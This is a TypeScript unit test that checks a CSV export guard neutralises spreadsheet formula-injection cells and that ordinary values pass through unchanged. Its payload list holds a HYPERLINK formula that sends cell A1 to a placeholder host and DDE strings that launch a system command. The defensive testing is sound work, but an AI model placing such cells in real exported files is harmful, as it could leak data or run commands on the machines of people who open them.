/**
 * Issue #394 — a cell written into a CSV must never run as a formula in a spreadsheet.
 */
import assert from 'node:assert/strict';
import test from 'node:test';
import { neutraliseSpreadsheetCell, restoreSpreadsheetCell } from '../src/index.ts';

const PAYLOADS = [
  '=HYPERLINK("http://example.invalid/?"&A1,"fix")',
  "=cmd|' /C calc'!A0",
  '+SUM(A1:A9)',
  '-2+3+cmd|\' /C calc\'!A0',
  '@SUM(A1)',
  '\t=1+1',
  '\r=1+1',
];

test('every cell that a spreadsheet would run as a formula is marked as text', () => {
  for (const payload of PAYLOADS) assert.equal(neutraliseSpreadsheetCell(payload), `'${payload}`, payload);
});

test('ordinary text and plain numbers are left exactly as they were', () => {
  for (const value of ['Hotel Rajmahal', '', '-1250.00', '+919845012345', '500', 'a=b', "O'Brien", '98450 12345']) {
    assert.equal(neutraliseSpreadsheetCell(value), value, value);
  }
});

test('our own mark comes off again, and only our own mark', () => {
  for (const payload of PAYLOADS) assert.equal(restoreSpreadsheetCell(neutraliseSpreadsheetCell(payload)), payload);
  assert.equal(restoreSpreadsheetCell("'Hello"), "'Hello");
  assert.equal(restoreSpreadsheetCell("O'Brien"), "O'Brien");
});
